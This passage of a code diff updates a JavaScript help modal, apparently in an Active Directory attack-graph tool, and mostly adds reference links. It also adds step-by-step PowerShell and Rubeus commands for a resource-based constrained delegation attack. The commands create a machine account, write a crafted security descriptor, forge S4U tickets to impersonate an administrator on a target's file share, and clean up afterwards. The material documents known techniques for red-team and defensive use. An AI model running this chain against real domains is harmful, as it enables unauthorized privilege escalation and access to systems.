+                    <code>New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)</code>
+                    
+                    PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:
+                    
+                    <code>$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid</code>
+                    
+                    We now need to build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE:
+                    
+                    <code>$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+                    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+                    $SD.GetBinaryForm($SDBytes, 0)</code>
+                    
+                    Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
+                    
+                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    
+                    We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
+                    
+                    <code>Rubeus.exe hash /password:Summer2018!</code>
+                    
+                    And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:
+                    
+                    <code>Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt</code>
+
+                    Cleanup can be done using the Remove-DomainObjectAcl function:
+
+                    <code>Remove-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All</code>
+                    
+                    Cleanup for the owner can be done by using Set-DomainObjectOwner once again`;
+                }
             } else if (targetType === "Domain") {
                 text = `To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView.
 
@@ -1101,25 +1448,55 @@ export default class HelpModal extends Component {
             <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a>
             <a href="https://adsecurity.org/?p=1729">https://adsecurity.org/?p=1729</a>
             <a href="http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/">http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/</a>
-            <a href="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e">https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e</a>`;
+            <a href="https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e">https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e</a>
+            <a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
+            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
+            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
+            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
+            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
+            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
             formatted = text;
         } else if (edge.label === "GenericWrite") {
             let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
             <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a>
-            <a href="http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/">http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/</a>`;
+            <a href="http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/">http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/</a>
+            <a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
+            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
+            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
+            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
+            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
+            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
             formatted = text;
         } else if (edge.label === "Owns") {
             let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
             <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a>
-            <a href="http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm">http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm</a>`;
+            <a href="http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm">http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm</a>
+            <a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
+            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
+            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
+            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
+            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
+            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
             formatted = text;
         } else if (edge.label === "WriteDacl") {
             let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
-            <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a>`;
+            <a href="https://www.youtube.com/watch?v=z8thoG7gPd0">https://www.youtube.com/watch?v=z8thoG7gPd0</a>
+            <a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
+            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
+            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
+            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
+            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
+            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
             formatted = text;
         } else if (edge.label === "WriteOwner") {
             let text = `<a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
-            <a href="http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm">http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm</a>`;
+            <a href="http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm">http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm</a>
+            <a href="https://eladshamir.com/2019/01/28/Wagging-the-Dog.html">https://eladshamir.com/2019/01/28/Wagging-the-Dog.html</a>
+            <a href="https://github.com/GhostPack/Rubeus#s4u">https://github.com/GhostPack/Rubeus#s4u</a>
+            <a href="https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff">https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff</a>
+            <a href="http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/">http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/</a>
+            <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a>
+            <a href="https://github.com/Kevin-Robertson/Powermad#new-machineaccount">https://github.com/Kevin-Robertson/Powermad#new-machineaccount</a>`;
             formatted = text;
         } else if (edge.label === "CanRDP") {
             let text = `<a href="https://michael-eder.net/post/2018/native_rdp_pass_the_hash/">https://michael-eder.net/post/2018/native_rdp_pass_the_hash/</a>
